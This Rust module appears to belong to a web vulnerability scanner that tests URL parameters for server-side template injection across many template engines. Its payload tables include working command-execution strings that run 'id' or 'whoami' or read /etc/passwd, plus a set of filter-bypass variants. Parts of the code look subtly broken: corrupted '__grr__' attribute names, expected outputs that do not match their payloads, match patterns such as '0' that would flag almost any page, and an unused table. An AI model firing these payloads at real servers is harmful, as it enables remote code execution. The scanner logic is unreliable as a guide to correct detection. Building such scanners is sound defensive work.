//! Server-Side Template Injection (SSTI) detection — multi-engine, multi-stage.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use regex::Regex;
use url::Url;

/// SSTI payloads organized by template engine with RCE-stage escalation.
const SSTI_PAYLOADS: &[(&str, &str, &str)] = &[
    // Jinja2 (Python) — basic detection
    ("Jinja2", "{{7*7}}", r"49"),
    ("Jinja2", "{{7*'7'}}", r"7777777"),
    ("Jinja2", "{{config}}", r"(?i)<.*Config.*>"),
    ("Jinja2", "{{self}}", r"(?i)<.*TemplateReference.*>"),
    ("Jinja2", "{{''.__class__.__mro__}}", r"(?i)object"),
    ("Jinja2", "{{request.application.__grr__}}", r"(?i)app"),
    ("Jinja2", "{{get_flashed_messages.__grr__}}", r"(?i)grr"),
    // Jinja2 RCE escalation
    (
        "Jinja2",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        r"(?i)subprocess",
    ),
    (
        "Jinja2",
        "{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if x.__name__=='catch_warnings' %}{{ x()._module.__grr__ }}{% endif %}{% endfor %}",
        r"(?i)grr",
    ),
    (
        "Jinja2",
        "{{ self.__dict__.__class__.__mro__[1].__subclasses__() }}",
        r"(?i)catch_warnings",
    ),
    (
        "Jinja2",
        "{% for c in [].__class__.__bases__[0].__subclasses__() %}{% if c.__name__=='Popen' %}{{ c('/bin/cat /etc/passwd',shell=True,stdout=-1).communicate() }}{% endif %}{% endfor %}",
        r"root:",
    ),
    // Jinja2 URL-based OOB
    (
        "Jinja2",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        r"(?i)catch_warnings",
    ),
    ("Jinja2", "{{url_for.__grr__}}", r"(?i)grr"),
    ("Jinja2", "{{url_for.__grr__.__init__.__grr__}}", r"(?i)grr"),
    // Twig (PHP) — basic detection
    ("Twig", "{{7*7}}", r"49"),
    ("Twig", "{{7*'7'}}", r"7777777"),
    ("Twig", "{{app}}", r"(?i)Twig"),
    ("Twig", "{{dump()}}", r"(?i)VAR DUMP"),
    ("Twig", "{{'foo'..'bar'}}", r"foo"),
    ("Twig", "{{_self.getiterator()}}", r"(?i)Twig"),
    // Twig RCE escalation
    (
        "Twig",
        "{{_self.getiterator(['system','id'])}}",
        r"(?i)uid=",
    ),
    ("Twig", "{{include('/etc/passwd')}}", r"root:"),
    ("Twig", "{{file_get_contents('/etc/passwd')}}", r"root:"),
    // Smarty (PHP)
    ("Smarty", "{$smarty.version}", r"\d+\.\d+"),
    ("Smarty", "{$7*7}", r"49"),
    ("Smarty", "{$smarty.server.PHP_SELF}", r"(?i)cgi-bin"),
    // Freemarker (Java)
    ("Freemarker", "${7*7}", r"49"),
    ("Freemarker", "${7*'7'}", r"7777777"),
    ("Freemarker", "${.version}", r"(?i)Freemarker"),
    (
        "Freemarker",
        "${freemarker.runtime_version}",
        r"(?i)Freemarker",
    ),
    ("Freemarker", "${.main}", r"(?i)main"),
    ("Freemarker", "${.template}?has_content", r"(?i)yes"),
    ("Freemarker", "${.freemarker_version}", r"(?i)Freemarker"),
    // Velocity (Java)
    ("Velocity", "#set($x=7*7)$x", r"49"),
    (
        "Velocity",
        "#set($x=$runtime.class.name)$x",
        r"(?i)Velocity",
    ),
    (
        "Velocity",
        "#set($ctx=$class.forName('java.lang.Runtime').getRuntime().exec('id'))",
        r"(?i)uid=",
    ),
    (
        "Velocity",
        "#set($str=$class.forName('java.lang.String').valueOf(7*7))$str",
        r"49",
    ),
    // Mako (Python)
    ("Mako", "${7*7}", r"49"),
    (
        "Mako",
        "${config.__class__.__init__.__globals__}",
        r"(?i)mako",
    ),
    ("Mako", "${self.module.__class__.__mro__}", r"object"),
    // Jade/Pug (Node.js)
    ("Jade/Pug", "= 7*7", r"49"),
    ("Jade/Pug", "#{7*7}", r"49"),
    // EJS (Node.js)
    ("EJS", "<%= 7*7 %>", r"49"),
    (
        "EJS",
        "<%= process.mainModule.require('child_process').execSync('id') %>",
        r"(?i)uid=",
    ),
    ("EJS", "<%- 7*7 %>", r"49"),
    // Handlebars (Node.js)
    ("Handlebars", "{{7*7}}", r"49"),
    (
        "Handlebars",
        "{{#with this as |foo|}}{{foo.7*7}}{{/with}}",
        r"49",
    ),
    // Nunjucks (Node.js)
    ("Nunjucks", "{{7*7}}", r"49"),
    ("Nunjucks", "{{7*'7'}}", r"7777777"),
    // Mustache
    ("Mustache", "{{7*7}}", r"\{\{7\*7\}\}"),
    // Liquid (Ruby)
    ("Liquid", "{{7*7}}", r"49"),
    ("Liquid", "{{site.password}}", r"(?i)liquid"),
    // Generic (must try all engines)
    ("Generic", "${7*7}", r"49"),
    ("Generic", "${{7*7}}", r"49"),
    ("Generic", "#{7*7}", r"49"),
    ("Generic", "${'7'*7}", r"7777777"),
    ("Generic", "${7+\"7\"}", r"14"),
    ("Generic", "#{7*7}", r"49"),
    ("Generic", "{{7*7}}", r"49"),
    // Encoding-based bypasses
    (
        "Jinja2",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        r"(?i)uid=",
    ),
    (
        "Twig",
        "{{_self.getiterator(['system','whoami'])}}",
        r"(?i)uid=",
    ),
    // Jinja2 — math/format primitives
    ("Jinja2", "{{7+7}}", r"14"),
    ("Jinja2", "{{7-7}}", r"0"),
    ("Jinja2", "{{7/7}}", r"1\.0"),
    ("Jinja2", "{{7//7}}", r"1"),
    ("Jinja2", "{{7%7}}", r"0"),
    ("Jinja2", "{{7**7}}", r"823543"),
    ("Jinja2", "{{[7*7]}}", r"49"),
    ("Jinja2", "{{'7'|int*7}}", r"49"),
    ("Jinja2", "{{'x'*7}}", r"xxxxxxx"),
    ("Jinja2", "{{'grym'|upper}}", r"GRYM"),
    ("Jinja2", "{{'grym'|reverse}}", r"myrg"),
    ("Jinja2", "{{'GRYM_TEST'|lower}}", r"grym_test"),
    ("Jinja2", "{{'7'|e}}", r"7"),
    ("Jinja2", "{{config.items()}}", r"(?i)config"),
    ("Jinja2", "{{config['SECRET_KEY']}}", r"(?i)secret"),
    ("Jinja2", "{{request}}", r"(?i)request"),
    ("Jinja2", "{{session}}", r"(?i)session"),
    ("Jinja2", "{% debug %}", r"(?i)context"),
    ("Jinja2", "{{config|string}}", r"(?i)config"),
    (
        "Jinja2",
        "{{dict.__base__.__subclasses__()}}",
        r"(?i)object",
    ),
    ("Jinja2", "{{''|attr('__class__')}}", r"(?i)str"),
    ("Jinja2", "{{()|attr('__class__')}}", r"(?i)tuple"),
    // Jinja2 RCE — globals reachable via builtin objects
    (
        "Jinja2",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        r"(?i)uid=",
    ),
    (
        "Jinja2",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        r"(?i)uid=",
    ),
    (
        "Jinja2",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        r"(?i)uid=",
    ),
    (
        "Jinja2",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        r"(?i)uid=",
    ),
    (
        "Jinja2",
        "{{range.__init__.__globals__.os.popen('id').read()}}",
        r"(?i)uid=",
    ),
    (
        "Jinja2",
        "{{url_for.__globals__['os'].popen('id').read()}}",
        r"(?i)uid=",
    ),
    (
        "Jinja2",
        "{{get_flashed_messages.__globals__['os'].popen('id').read()}}",
        r"(?i)uid=",
    ),
    // Twig — math, filters, file read, callback RCE
    ("Twig", "{{7+7}}", r"14"),
    ("Twig", "{{7**7}}", r"823543"),
    ("Twig", "{{7~7}}", r"77"),
    ("Twig", "{{['foo','bar']|join}}", r"foobar"),
    ("Twig", "{{'grym'|upper}}", r"GRYM"),
    ("Twig", "{{'foo'|length}}", r"3"),
    ("Twig", "{{'grym'|base64_encode}}", r"(?i)Z3J5bQ=="),
    ("Twig", "{{dump(app)}}", r"(?i)twig"),
    ("Twig", "{{_self.env}}", r"(?i)twig"),
    (
        "Twig",
        "{{_self.env.registerUndefinedFilterCallback('system')}}",
        r"(?i)uid=",
    ),
    ("Twig", "{{'id'|map('system')}}", r"(?i)uid="),
    ("Twig", "{{['id']|filter('system')}}", r"(?i)uid="),
    ("Twig", "{{['id']|reduce('system')}}", r"(?i)uid="),
    ("Twig", "{{include('file:///etc/passwd')}}", r"root:"),
    ("Twig", "{{source('/etc/passwd')}}", r"root:"),
    // Smarty
    ("Smarty", "{if 7*7==49}GRYM_SMARTY{/if}", r"GRYM_SMARTY"),
    ("Smarty", "{php}echo 7*7;{/php}", r"49"),
    ("Smarty", "{$x=7*7}{$x}", r"49"),
    ("Smarty", "{'7'*7}", r"7777777"),
    ("Smarty", "{$smarty._current_file}", r"(?i)\.tpl"),
    ("Smarty", "{$smarty.template}", r"(?i)\.tpl"),
    (
        "Smarty",
        "{if 1}GRYM_SMARTY_FOUND{/if}",
        r"GRYM_SMARTY_FOUND",
    ),
    // Freemarker
    ("Freemarker", "${7+7}", r"14"),
    ("Freemarker", "${(7*7)?c}", r"49"),
    ("Freemarker", "${7?string('0000')}", r"0007"),
    ("Freemarker", "${'7'?length}", r"1"),
    ("Freemarker", "${''?length}", r"0"),
    ("Freemarker", "${.now}", r"\d{4}"),
    ("Freemarker", "<#assign x=7*7>${x}", r"49"),
    ("Freemarker", "<#assign x='grym'?upper_case>${x}", r"GRYM"),
    (
        "Freemarker",
        "<#if 7*7==49>GRYM_FREEMARKER</#if>",
        r"GRYM_FREEMARKER",
    ),
    (
        "Freemarker",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        r"(?i)uid=",
    ),
    // Velocity
    ("Velocity", "#set($x=7+7)$x", r"14"),
    ("Velocity", "#set($x=7**7)$x", r"823543"),
    ("Velocity", "#set($x='grym')$x.toUpperCase()", r"GRYM"),
    (
        "Velocity",
        "#if(7*7==49)GRYM_VELOCITY#end",
        r"GRYM_VELOCITY",
    ),
    ("Velocity", "#set($x=$math.multiply(7,7))$x", r"49"),
    // Mako
    ("Mako", "${7+7}", r"14"),
    ("Mako", "${'grym'.upper()}", r"GRYM"),
    ("Mako", "${len('grym')}", r"4"),
    (
        "Mako",
        "${__import__('os').popen('id').read()}",
        r"(?i)uid=",
    ),
    (
        "Mako",
        "${''.__class__.__bases__[0].__subclasses__()}",
        r"(?i)builtins",
    ),
    // Jade/Pug
    ("Jade/Pug", "!= 7*7", r"49"),
    ("Jade/Pug", "= 'grym'.toUpperCase()", r"GRYM"),
    ("Jade/Pug", "#{'7'*7}", r"7777777"),
    // EJS
    ("EJS", "<%= 7+7 %>", r"14"),
    ("EJS", "<%= 'grym'.toUpperCase() %>", r"GRYM"),
    ("EJS", "<%= process.version %>", r"(?i)v\d+\."),
    ("EJS", "<%= typeof require %>", r"(?i)function"),
    (
        "EJS",
        "<%= require('child_process').execSync('id').toString() %>",
        r"(?i)uid=",
    ),
    (
        "EJS",
        "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>",
        r"(?i)uid=",
    ),
    ("EJS", "<%- 7+7 %>", r"14"),
    (
        "EJS",
        "<% for(var i=0;i<1;i++){ %>GRYM_EJS<% } %>",
        r"GRYM_EJS",
    ),
    // Handlebars — prototype-chain reachability
    ("Handlebars", "{{lookup . 'constructor'}}", r"(?i)function"),
    (
        "Handlebars",
        "{{#with .}}{{constructor}}{{/with}}",
        r"(?i)function",
    ),
    ("Handlebars", "{{#each this}}GRYM_HB{{/each}}", r"GRYM_HB"),
    // Nunjucks
    ("Nunjucks", "{{7+7}}", r"14"),
    ("Nunjucks", "{{'grym'|upper}}", r"GRYM"),
    (
        "Nunjucks",
        "{{range.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
        r"(?i)uid=",
    ),
    (
        "Nunjucks",
        "{{[].constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
        r"(?i)uid=",
    ),
    // Liquid
    ("Liquid", "{{ 7 | plus:7 }}", r"14"),
    ("Liquid", "{{ 7 | times:7 }}", r"49"),
    ("Liquid", "{{ 'grym' | upcase }}", r"GRYM"),
    ("Liquid", "{{ 'GRYM' | downcase }}", r"grym"),
    ("Liquid", "{{ 'grym' | size }}", r"4"),
    ("Liquid", "{{ 'hello' | append: 'world' }}", r"helloworld"),
    (
        "Liquid",
        "{% if 7*7 == 49 %}GRYM_LIQUID{% endif %}",
        r"GRYM_LIQUID",
    ),
    ("Liquid", "{% assign x = 7 | times: 7 %}{{ x }}", r"49"),
    // ERB (Ruby)
    ("ERB", "<%= 7*7 %>", r"49"),
    ("ERB", "<%= 7+7 %>", r"14"),
    ("ERB", "<%= 7**7 %>", r"823543"),
    ("ERB", "<%= 'grym'.upcase %>", r"GRYM"),
    ("ERB", "<%= ENV['PATH'] %>", r"(?i)bin"),
    ("ERB", "<%= system('id') %>", r"(?i)uid="),
    ("ERB", "<%= `id` %>", r"(?i)uid="),
    ("ERB", "<%= %x{id} %>", r"(?i)uid="),
    // Go templates
    ("Go", "{{$x := 7}}{{$x}}", r"7"),
    ("Go", "{{len \"grym\"}}", r"4"),
    ("Go", "{{html \"<b>\"}}", r"(?i)&lt;b&gt;"),
    ("Go", "{{7*7}}", r"49"),
    // Razor (ASP.NET)
    ("Razor", "@(7*7)", r"49"),
    ("Razor", "@(7+7)", r"14"),
    ("Razor", "@(DateTime.Now.Year)", r"\d{4}"),
    ("Razor", "@{var x=7*7;}@(x)", r"49"),
    // Thymeleaf
    ("Thymeleaf", "${7*7}", r"49"),
    ("Thymeleaf", "[[${7*7}]]", r"49"),
    ("Thymeleaf", "[(${7*7})]", r"49"),
    ("Thymeleaf", "${7+7}", r"14"),
    ("Thymeleaf", "${T(java.lang.Math).random()}", r"0\."),
    ("Thymeleaf", "<span th:text=\"${7*7}\">x</span>", r"49"),
    // Pebble
    ("Pebble", "{{7*7}}", r"49"),
    ("Pebble", "{{7+7}}", r"14"),
    ("Pebble", "{{'grym'|upper}}", r"GRYM"),
    // Blade (Laravel)
    ("Blade", "{{7*7}}", r"49"),
    ("Blade", "{{7+7}}", r"14"),
    ("Blade", "{{strtoupper('grym')}}", r"GRYM"),
    // Django
    ("Django", "{{7}}", r"7"),
    ("Django", "{{'7'}}", r"7"),
    ("Django", "{{1|add:1}}", r"2"),
    ("Django", "{{'grym'|upper}}", r"GRYM"),
    ("Django", "{{request.user}}", r"(?i)anonymous"),
    // Tera (Rust)
    ("Tera", "{{7*7}}", r"49"),
    ("Tera", "{{ 7 * 7 }}", r"49"),
    ("Tera", "{{ 'grym' | upper }}", r"GRYM"),
    // JSP EL
    ("JSP EL", "${7*7}", r"49"),
    ("JSP EL", "${7+7}", r"14"),
    ("JSP EL", "${7-7}", r"0"),
    ("JSP EL", "${7%7}", r"0"),
    ("JSP EL", "${'7'}", r"7"),
    ("JSP EL", "${1 gt 0}", r"true"),
    ("JSP EL", "${'grym'.length()}", r"4"),
    ("JSP EL", "${7.0/7}", r"1\.0"),
    // Groovy templates
    ("Groovy", "${7*7}", r"49"),
    ("Groovy", "${7+7}", r"14"),
    ("Groovy", "${'grym'.toUpperCase()}", r"GRYM"),
    // Dust.js
    ("Dust", "{7*7}", r"49"),
    ("Dust", "{7+7}", r"14"),
];

/// URL-safe encoding variants for SSTI bypass.
const SSTI_ENCODED_VARIANTS: &[(&str, &str, &str)] = &[
    ("Jinja2", "{{7*7}}", r"49"),
    ("Jinja2", "{{ 7*7 }}", r"49"),
    ("Jinja2", "{{=7*7}}", r"49"),
    ("Jinja2", "{{ (!7*7)-!7*7 }}", r"49"),
    ("Jinja2", "{{''.center(49)}}", r"49"),
    ("Twig", "{{7*7}}", r"49"),
    ("Twig", "{{ 7*7 }}", r"49"),
    ("Freemarker", "${7*7}", r"49"),
    ("Freemarker", "${(7*7)}", r"49"),
    ("Freemarker", "${(7+\"7\")}", r"49"),
    ("Velocity", "#set($x=7*7)$x", r"49"),
    ("Jinja2", "{{'7'*7}}", r"7777777"),
    ("Jinja2", "{% if 7*7==49 %}GRYM_ENC{% endif %}", r"GRYM_ENC"),
    ("Jinja2", "{{7*'7'}}", r"7777777"),
    ("Twig", "{{7**7}}", r"823543"),
    ("Twig", "{{7~7}}", r"77"),
    ("Freemarker", "<#assign x=7*7>${x}", r"49"),
    ("Velocity", "#set($x=7+7)$x", r"14"),
    ("EJS", "<%= 7*7 %>", r"49"),
    ("ERB", "<%= 7*7 %>", r"49"),
    ("Mako", "${7*7}", r"49"),
    ("Razor", "@(7*7)", r"49"),
    ("Liquid", "{{ 7 | times:7 }}", r"49"),
    ("Thymeleaf", "[[${7*7}]]", r"49"),
    ("JSP EL", "${7*7}", r"49"),
    ("Go", "{{printf \"%d\" 49}}", r"49"),
    ("Tera", "{{7*7}}", r"49"),
    ("Django", "{{1|add:1}}", r"2"),
    ("Pebble", "{{7*7}}", r"49"),
];

/// WAF bypass variants for SSTI payloads.
const SSTI_WAF_BYPASS: &[(&str, &str, &str)] = &[
    ("Jinja2", "{{/*7*/7}}", r"49"),
    ("Jinja2", "{{/**/7/**/*7/**/}}", r"49"),
    ("Jinja2", "{{7/**/7}}", r"49"),
    ("Jinja2", "{% raw %}{{7*7}}{% endraw %}", r"49"),
    ("Jinja2", "{{ config['class'].__init__.__globals__ }}", r""),
    ("Twig", "{{/**/7/**/7}}", r"49"),
    ("Twig", "{{ 7 /* comment */ * 7 }}", r"49"),
    ("Freemarker", "${/**/7/**/*7}", r"49"),
    ("Velocity", "#set/* comment */($x=7*7)$x", r"49"),
    ("Jinja2", "{{7*\t7}}", r"49"),
    ("Jinja2", "{{7*\n7}}", r"49"),
    ("Jinja2", "{{7*\u{a0}7}}", r"49"),
    ("Jinja2", "{{7*'7'}}", r"7777777"),
    ("Jinja2", "{%raw%}{{7*7}}{%endraw%}", r"49"),
    ("Twig", "{{7*\t7}}", r"49"),
    ("Twig", "{{7*'7'}}", r"7777777"),
    ("Freemarker", "${7*\t7}", r"49"),
    ("Velocity", "#set($x=7+7)$x", r"14"),
    ("EJS", "<%= 7*7 %>", r"49"),
    ("Liquid", "{{ 7 | times: 7 }}", r"49"),
    ("Thymeleaf", "[(${7*7})]", r"49"),
    ("Tera", "{{ 7 * 7 }}", r"49"),
    ("Mako", "${7*7}", r"49"),
    ("Razor", "@(7*7)", r"49"),
];

/// Extract template engine hints from response headers and body.
pub fn detect_template_engine(body: &str, headers: &[(String, String)]) -> Option<String> {
    let indicators = [
        (r"(?i)freemarker", "Freemarker"),
        (r"(?i)twig", "Twig"),
        (r"(?i)jinja", "Jinja2"),
        (r"(?i)velocity", "Velocity"),
        (r"(?i)mako", "Mako"),
        (r"(?i)liquid", "Liquid"),
        (r"(?i)ejs", "EJS"),
        (r"(?i)nunjucks", "Nunjucks"),
        (r"(?i)handlebars", "Handlebars"),
        (r"X-Powered-By:.*Twig", "Twig"),
        (r"X-Powered-By:.*Jinja", "Jinja2"),
        (r"X-AspNet-Version", "ASP.NET"),
        (r"X-Laravel", "Laravel"),
        (r"X-Earlgrey", "Earlgrey/Laravel"),
        (r"Set-Cookie:.*laravel_session", "Laravel"),
        (r"Set-Cookie:.*twig", "Twig"),
    ];

    let combined = format!(
        "{}\n{}",
        headers
            .iter()
            .map(|(k, v)| format!("{}: {}", k, v))
            .collect::<Vec<_>>()
            .join("\n"),
        body
    );

    for (pattern, engine) in &indicators {
        if let Ok(re) = Regex::new(pattern)
            && re.is_match(&combined)
        {
            return Some(engine.to_string());
        }
    }
    None
}

pub async fn check_ssti(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect::<Vec<_>>();

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _original_value) in &base_query {
        // Try all engine-specific payloads regardless of detected engine,
        // since many payloads work across multiple template engines.
        for (engine_label, payload, expected_pattern) in SSTI_PAYLOADS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &base_query {
                    let val = if k == param_name {
                        payload.to_string()
                    } else {
                        v.clone()
                    };
                    pairs.append_pair(k, &val);
                }
            }

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
                && let Ok(re) = Regex::new(expected_pattern)
                && re.is_match(&response.body)
            {
                let mut f = Finding::new(
                    format!(
                        "SSTI detected in parameter '{}' ({} engine)",
                        param_name, engine_label
                    ),
                    AssetRef {
                        identifier: url.to_string(),
                        kind: "web".into(),
                    },
                    Severity::Critical,
                    Confidence::Confirmed,
                    "grym-web-scanner",
                );
                f.categories.push("A05:2025-Injection".into());
                f.cwe_ids.push(1336);
                f.evidence.push(Evidence::redacted(
                    "ssti-reflection",
                    format!(
                        "Engine: {}, Payload: {}, Match: {}",
                        engine_label, payload, expected_pattern
                    ),
                    response.body.chars().take(200).collect::<String>(),
                ));
                f.remediation = "Do not render user input in templates. Use sandboxed template engines with strict whitelists and auto-escaping.".into();
                f.references
                    .push("https://owasp.org/www-project-web-security-testing-guide/".into());
                findings.push(f);
                break;
            }
        }

        // If no engine detected, try WAF bypass variants
        if findings.iter().all(|f| !f.title.contains(param_name)) {
            for (_engine_label, payload, expected_pattern) in SSTI_WAF_BYPASS {
                let mut test_url = url.clone();
                {
                    let mut pairs = test_url.query_pairs_mut();
                    pairs.clear();
                    for (k, v) in &base_query {
                        let val = if k == param_name {
                            payload.to_string()
                        } else {
                            v.clone()
                        };
                        pairs.append_pair(k, &val);
                    }
                }

                if let Ok(response) = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    && let Ok(re) = Regex::new(expected_pattern)
                    && re.is_match(&response.body)
                {
                    let mut f = Finding::new(
                        format!("WAF-bypassed SSTI detected in parameter '{}'", param_name),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Critical,
                        Confidence::Confirmed,
                        "grym-web-scanner",
                    );
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(1336);
                    f.evidence.push(Evidence::redacted(
                        "ssti-waf-bypass",
                        format!("WAF bypass payload: {}", payload),
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Deploy a WAF with SSTI-specific protection and use sandboxed template engines.".into();
                    f.references.push(
                        "https://docs.palletsprojects.com/en/latest/jinja2/templates/#security"
                            .into(),
                    );
                    findings.push(f);
                    break;
                }
            }
        }
    }

    Ok(findings)
}
